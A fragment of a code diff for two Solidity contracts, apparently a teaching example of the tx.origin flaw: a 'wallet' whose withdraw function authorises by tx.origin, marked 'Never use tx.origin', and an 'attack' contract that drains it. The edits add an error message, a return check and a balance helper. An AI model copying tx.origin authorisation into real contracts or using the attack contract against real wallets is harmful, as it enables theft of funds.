@@ -13,9 +13,10 @@ contract wallet {
     
     function withdraw(address payable _to, uint256 _val) external returns(bool){
         // Never use tx.origin
-        require(tx.origin == self);
+        require(tx.origin == self, "unauth");
         require(address(this).balance >= _val);
         (bool retVal, ) = _to.call{value : _val}("");
+		require(retVal);
         return retVal;
     }
     
@@ -35,5 +36,9 @@ contract attack {
     
     function withdraw() external {
         w.withdraw(self, w.balanceOf());
+    }
+	
+	function balanceOf() external view returns(uint256) {
+        return address(this).balance;
     }
 }
